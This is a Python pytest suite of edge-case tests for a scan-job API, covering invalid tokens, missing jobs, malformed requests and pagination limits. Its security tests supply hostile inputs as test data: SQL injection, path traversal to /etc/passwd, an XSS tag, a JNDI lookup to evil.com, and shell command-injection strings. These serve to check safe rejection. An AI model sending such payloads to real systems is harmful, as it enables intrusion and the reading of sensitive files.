"""
Edge Case Tests for Data Extraction Service API.

Tests that validate API behavior when confronted with invalid inputs,
unexpected states, and boundary conditions to ensure robustness.
"""
import pytest
import json
from tests.utils.assertions import (
    assert_http_status,
    assert_error_message_present,
    assert_error_message_contains,
)
from tests.utils.test_helpers import extract_json_response


@pytest.mark.edge_case
class TestInvalidAuthentication:
    """Tests for invalid authentication scenarios."""
    
    def test_start_extraction_invalid_token(self, api_client):
        """
        Test: Empty/malformed API token (400/401).
        
        Verifies that API rejects invalid authentication tokens.
        """
        response = api_client.post(
            '/api/v1/scan/start',
            data=json.dumps({'api_token': 'invalid_token_12345'}),
            content_type='application/json'
        )
        
        # Should return 400 or 401
        assert response.status_code in [400, 401]
        assert_error_message_present(response)
        assert_error_message_contains(response, 'token')
    
    def test_start_extraction_missing_token(self, api_client):
        """
        Test: No token provided (400/401).
        
        Verifies that API rejects requests without authentication.
        """
        response = api_client.post(
            '/api/v1/scan/start',
            data=json.dumps({}),
            content_type='application/json'
        )
        
        assert response.status_code in [400, 401]
        assert_error_message_present(response)
    
    def test_start_extraction_empty_token(self, api_client):
        """
        Test: Empty string token.
        
        Verifies that empty tokens are rejected.
        """
        response = api_client.post(
            '/api/v1/scan/start',
            data=json.dumps({'api_token': ''}),
            content_type='application/json'
        )
        
        assert response.status_code in [400, 401]
        assert_error_message_present(response)
    
    def test_start_extraction_whitespace_token(self, api_client):
        """
        Test: Token with only whitespace.
        
        Verifies that whitespace-only tokens are rejected.
        """
        response = api_client.post(
            '/api/v1/scan/start',
            data=json.dumps({'api_token': '   '}),
            content_type='application/json'
        )
        
        assert response.status_code in [400, 401]
        assert_error_message_present(response)


@pytest.mark.edge_case
class TestNonExistentResources:
    """Tests for accessing non-existent resources."""
    
    def test_status_nonexistent_job_id(self, api_client):
        """
        Test: Request status for invalid job_id (404).
        
        Verifies that requesting status for non-existent job returns 404.
        """
        fake_job_id = 'nonexistent-job-12345'
        response = api_client.get(f'/api/v1/scan/status/{fake_job_id}')
        
        assert_http_status(response, 404)
        assert_error_message_present(response)
        assert_error_message_contains(response, 'not found')
    
    def test_result_nonexistent_job_id(self, api_client):
        """
        Test: Request results for invalid job_id (404).
        
        Verifies that requesting results for non-existent job returns 404.
        """
        fake_job_id = 'nonexistent-job-67890'
        response = api_client.get(f'/api/v1/scan/result/{fake_job_id}')
        
        assert_http_status(response, 404)
        assert_error_message_present(response)
    
    def test_cancel_nonexistent_job_id(self, api_client):
        """
        Test: Cancel non-existent job (404).
        
        Verifies that cancelling non-existent job returns 404.
        """
        fake_job_id = 'nonexistent-job-abc'
        response = api_client.post(f'/api/v1/scan/cancel/{fake_job_id}')
        
        assert_http_status(response, 404)
        assert_error_message_present(response)
    
    def test_remove_nonexistent_job_id(self, api_client):
        """
        Test: Remove non-existent job (404).
        
        Verifies that removing non-existent job returns 404.
        """
        fake_job_id = 'nonexistent-job-xyz'
        response = api_client.delete(f'/api/v1/scan/remove/{fake_job_id}')
        
        assert_http_status(response, 404)
        assert_error_message_present(response)


@pytest.mark.edge_case
class TestInvalidStateAccess:
    """Tests for accessing resources in invalid states."""
    
    def test_result_for_pending_job(self, api_client, seed_pending_job):
        """
        Test: Access results before completion (409/400).
        
        Verifies that results cannot be accessed for pending jobs.
        """
        job_id = seed_pending_job['id']
        response = api_client.get(f'/api/v1/scan/result/{job_id}')
        
        assert response.status_code in [400, 409]
        assert_error_message_present(response)
        assert_error_message_contains(response, 'not completed')
    
    def test_result_for_in_progress_job(self, api_client, seed_in_progress_job):
        """
        Test: Access results while job running (409/400).
        
        Verifies that results cannot be accessed while job is in progress.
        """
        job_id = seed_in_progress_job['id']
        response = api_client.get(f'/api/v1/scan/result/{job_id}')
        
        assert response.status_code in [400, 409]
        assert_error_message_present(response)
    
    def test_cancel_completed_job(self, api_client, seed_completed_job):
        """
        Test: Cancel already completed job (400/409).
        
        Verifies that completed jobs cannot be cancelled.
        """
        job_data, _ = seed_completed_job
        job_id = job_data['id']
        
        response = api_client.post(f'/api/v1/scan/cancel/{job_id}')
        
        assert response.status_code in [400, 409]
        assert_error_message_present(response)
        assert_error_message_contains(response, 'cannot be cancelled')
    
    def test_cancel_failed_job(self, api_client, seed_failed_job):
        """
        Test: Cancel already failed job (400/409).
        
        Verifies that failed jobs cannot be cancelled.
        """
        job_id = seed_failed_job['id']
        response = api_client.post(f'/api/v1/scan/cancel/{job_id}')
        
        assert response.status_code in [400, 409]
        assert_error_message_present(response)
    
    def test_cancel_cancelled_job(self, api_client, seed_cancelled_job):
        """
        Test: Cancel already cancelled job (400/409).
        
        Verifies that cancelled jobs cannot be cancelled again.
        """
        job_id = seed_cancelled_job['id']
        response = api_client.post(f'/api/v1/scan/cancel/{job_id}')
        
        # Should return error or idempotent success
        assert response.status_code in [200, 400, 409]
        
        if response.status_code in [400, 409]:
            assert_error_message_present(response)


@pytest.mark.edge_case
class TestMalformedRequests:
    """Tests for malformed request handling."""
    
    def test_malformed_json_body(self, api_client):
        """
        Test: Invalid JSON in POST request (400).
        
        Verifies that malformed JSON is rejected with clear error.
        """
        response = api_client.post(
            '/api/v1/scan/start',
            data='{"invalid": json}',  # Malformed JSON
            content_type='application/json'
        )
        
        assert_http_status(response, 400)
        assert_error_message_present(response)
    
    def test_missing_required_fields(self, api_client):
        """
        Test: Missing mandatory fields (400).
        
        Verifies that requests missing required fields are rejected.
        """
        response = api_client.post(
            '/api/v1/scan/start',
            data=json.dumps({'name': 'test'}),  # Missing required fields
            content_type='application/json'
        )
        
        assert_http_status(response, 400)
        assert_error_message_present(response)
    
    def test_invalid_content_type(self, api_client):
        """
        Test: Request with invalid content type.
        
        Verifies that non-JSON content types are handled appropriately.
        """
        response = api_client.post(
            '/api/v1/scan/start',
            data='api_token=test',
            content_type='application/x-www-form-urlencoded'
        )
        
        # Should either accept form data or return 400/415
        assert response.status_code in [200, 202, 400, 415]
    
    def test_empty_request_body(self, api_client):
        """
        Test: POST request with empty body.
        
        Verifies that empty request bodies are rejected.
        """
        response = api_client.post(
            '/api/v1/scan/start',
            data='',
            content_type='application/json'
        )
        
        assert_http_status(response, 400)
        assert_error_message_present(response)


@pytest.mark.edge_case
class TestSecurityValidation:
    """Tests for security-related validation."""
    
    def test_job_id_sql_injection(self, api_client):
        """
        Test: SQL injection patterns in job_id (400/404).
        
        Verifies that SQL injection attempts are handled safely.
        """
        malicious_id = "' OR '1'='1"
        response = api_client.get(f'/api/v1/scan/status/{malicious_id}')
        
        assert response.status_code in [400, 404]
        # Should not cause server error
        assert response.status_code != 500
    
    def test_job_id_excessive_length(self, api_client):
        """
        Test: Extremely long job_id string (400/404).
        
        Verifies that excessively long IDs are handled gracefully.
        """
        long_id = 'a' * 10000
        response = api_client.get(f'/api/v1/scan/status/{long_id}')
        
        assert response.status_code in [400, 404]
        assert response.status_code != 500
    
    def test_job_id_special_characters(self, api_client):
        """
        Test: Non-standard characters in job_id (400/404).
        
        Verifies that special characters in IDs are handled safely.
        """
        special_ids = [
            '../../../etc/passwd',
            '<script>alert("xss")</script>',
            '${jndi:ldap://evil.com}',
            '../../admin',
            'job\x00id',  # Null byte
        ]
        
        for special_id in special_ids:
            response = api_client.get(f'/api/v1/scan/status/{special_id}')
            
            # Should return 400 or 404, never 500
            assert response.status_code in [400, 404], f"Failed for ID: {special_id}"
            assert response.status_code != 500, f"Server error for ID: {special_id}"
    
    def test_path_traversal_attempt(self, api_client):
        """
        Test: Path traversal patterns in job_id.
        
        Verifies that path traversal attempts are blocked.
        """
        traversal_ids = [
            '../status',
            '../../jobs',
            './../admin',
            '....//....//etc/passwd'
        ]
        
        for traversal_id in traversal_ids:
            response = api_client.get(f'/api/v1/scan/status/{traversal_id}')
            
            assert response.status_code in [400, 404]
            assert response.status_code != 500
    
    def test_command_injection_attempt(self, api_client):
        """
        Test: Command injection patterns in parameters.
        
        Verifies that command injection attempts are blocked.
        """
        malicious_tokens = [
            '; ls -la',
            '| cat /etc/passwd',
            '`whoami`',
            '$(ls)',
        ]
        
        for token in malicious_tokens:
            response = api_client.post(
                '/api/v1/scan/start',
                data=json.dumps({'api_token': token}),
                content_type='application/json'
            )
            
            # Should reject with 400/401, not cause server error
            assert response.status_code in [400, 401]
            assert response.status_code != 500


@pytest.mark.edge_case
class TestBoundaryConditions:
    """Tests for boundary conditions and limits."""
    
    def test_pagination_negative_page(self, api_client, seed_completed_job):
        """
        Test: Negative page number in pagination.
        
        Verifies that negative page numbers are handled gracefully.
        """
        job_data, _ = seed_completed_job
        job_id = job_data['id']
        
        response = api_client.get(f'/api/v1/scan/result/{job_id}?page=-1')
        
        # Should return 400 or default to page 1
        assert response.status_code in [200, 400]
    
    def test_pagination_zero_page(self, api_client, seed_completed_job):
        """
        Test: Zero page number in pagination.
        
        Verifies that zero page number is handled (usually defaults to 1).
        """
        job_data, _ = seed_completed_job
        job_id = job_data['id']
        
        response = api_client.get(f'/api/v1/scan/result/{job_id}?page=0')
        
        # Should return 400 or default to page 1
        assert response.status_code in [200, 400]
    
    def test_pagination_excessive_per_page(self, api_client, seed_completed_job):
        """
        Test: Excessively large per_page value.
        
        Verifies that excessive per_page values are capped or rejected.
        """
        job_data, _ = seed_completed_job
        job_id = job_data['id']
        
        response = api_client.get(f'/api/v1/scan/result/{job_id}?per_page=999999')
        
        # Should either cap the value or return error
        assert response.status_code in [200, 400]
        
        if response.status_code == 200:
            data = extract_json_response(response)
            # Should not return excessive records
            assert len(data['data']) <= 1000  # Reasonable upper limit
    
    def test_pagination_zero_per_page(self, api_client, seed_completed_job):
        """
        Test: Zero per_page value.
        
        Verifies that zero per_page is rejected or defaulted.
        """
        job_data, _ = seed_completed_job
        job_id = job_data['id']
        
        response = api_client.get(f'/api/v1/scan/result/{job_id}?per_page=0')
        
        # Should return 400 or use default value
        assert response.status_code in [200, 400]
    
    def test_pagination_non_integer_page(self, api_client, seed_completed_job):
        """
        Test: Non-integer page parameter.
        
        Verifies that non-integer pagination params are rejected.
        """
        job_data, _ = seed_completed_job
        job_id = job_data['id']
        
        response = api_client.get(f'/api/v1/scan/result/{job_id}?page=abc')
        
        assert_http_status(response, 400)


@pytest.mark.edge_case
class TestUnsupportedOperations:
    """Tests for unsupported HTTP methods and operations."""
    
    def test_unsupported_http_method_on_status(self, api_client, seed_pending_job):
        """
        Test: Unsupported HTTP method on status endpoint.
        
        Verifies that unsupported methods return 405.
        """
        job_id = seed_pending_job['id']
        
        # Try POST on GET-only endpoint
        response = api_client.post(f'/api/v1/scan/status/{job_id}')
        
        assert response.status_code in [405, 400]
    
    def test_unsupported_http_method_on_result(self, api_client, seed_completed_job):
        """
        Test: Unsupported HTTP method on result endpoint.
        
        Verifies that unsupported methods return 405.
        """
        job_data, _ = seed_completed_job
        job_id = job_data['id']
        
        # Try DELETE on GET-only endpoint
        response = api_client.delete(f'/api/v1/scan/result/{job_id}')
        
        assert response.status_code in [405, 404]


@pytest.mark.edge_case
class TestErrorMessages:
    """Tests to ensure error messages are clear and helpful."""
    
    def test_error_message_format_consistency(self, api_client):
        """
        Test: Error responses have consistent format.
        
        Verifies that all error responses follow a consistent structure.
        """
        # Test various error scenarios
        test_cases = [
            api_client.get('/api/v1/scan/status/nonexistent'),
            api_client.post('/api/v1/scan/start', data='', content_type='application/json'),
        ]
        
        for response in test_cases:
            if response.status_code >= 400:
                data = extract_json_response(response)
                
                # Should have at least one error field
                error_fields = ['error', 'message', 'detail', 'error_message']
                has_error_field = any(field in data for field in error_fields)
                
                assert has_error_field, f"Error response missing error field: {data}"
    
    def test_error_includes_helpful_details(self, api_client):
        """
        Test: Error messages include helpful details.
        
        Verifies that error messages are actionable.
        """
        response = api_client.post(
            '/api/v1/scan/start',
            data=json.dumps({}),
            content_type='application/json'
        )
        
        if response.status_code >= 400:
            assert_error_message_present(response)
            
            data = extract_json_response(response)
            error_text = str(data)
            
            # Error should be more than just a status code
            assert len(error_text) > 20


